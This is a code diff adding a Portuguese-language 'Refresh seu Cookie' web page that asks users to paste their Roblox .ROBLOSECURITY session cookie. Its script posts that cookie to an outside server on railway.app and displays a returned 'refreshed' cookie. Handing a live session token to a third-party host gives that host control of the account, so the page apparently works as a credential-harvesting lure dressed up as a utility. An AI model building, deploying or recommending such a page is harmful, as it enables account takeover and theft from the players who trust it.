@@ -46,7 +46,17 @@
 
     #resposta {
       margin-top: 20px;
+      background-color: #1e1e1e;
+      padding: 15px;
+      border-radius: 8px;
+      overflow-x: auto;
+      max-width: 80%;
+      margin-left: auto;
+      margin-right: auto;
       white-space: pre-wrap;
+      word-break: break-word;
+      max-height: 200px; /* altura máxima para o scroll */
+      overflow-y: scroll; /* ativa o scroll se necessário */
     }
 
     #cookieContainer {
@@ -59,6 +69,11 @@
       overflow-x: auto;
     }
 
+    #copyBtn {
+      margin-top: 10px;
+      display: none; /* Esconde até o botão ser necessário */
+    }
+
     code {
       white-space: nowrap;
     }
@@ -67,4 +82,53 @@
 <body>
 
   <h1 class="main-title">Refresh seu Cookie</h1>
-  <input type="text" id="cookie"
+  <input type="text" id="cookie" placeholder="Cole seu .ROBLOSECURITY aqui" />
+  <br>
+  <button onclick="enviarCookie()">Refresh</button>
+
+  <div id="resposta" style="display: none;"></div>
+  <button id="copyBtn" onclick="copiarTexto()">Copiar</button>
+
+  <script>
+    async function enviarCookie() {
+      const cookie = document.getElementById("cookie").value;
+      const respostaElemento = document.getElementById("resposta");
+      const copyBtn = document.getElementById("copyBtn");
+
+      try {
+        const resposta = await fetch("https://robloxbp-production.up.railway.app/refresh", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ cookie })
+        });
+
+        const data = await resposta.json();
+
+        if (data.cookieAtualizado) {
+          respostaElemento.innerText = data.cookieAtualizado;
+          respostaElemento.style.display = "block";
+          copyBtn.style.display = "inline-block"; // Torna o botão visível
+        } else {
+          respostaElemento.innerText = data.error || "Erro inesperado";
+          respostaElemento.style.display = "block";
+          copyBtn.style.display = "none"; // Não exibe o botão se não houver cookie atualizado
+        }
+      } catch (error) {
+        respostaElemento.innerText = "Erro ao conectar com o servidor.";
+        respostaElemento.style.display = "block";
+        copyBtn.style.display = "none";
+      }
+    }
+
+    function copiarTexto() {
+      const texto = document.getElementById("resposta").innerText;
+      navigator.clipboard.writeText(texto).then(() => {
+        alert("Copiado para a área de transferência!");
+      });
+    }
+  </script>
+
+</body>
+</html>
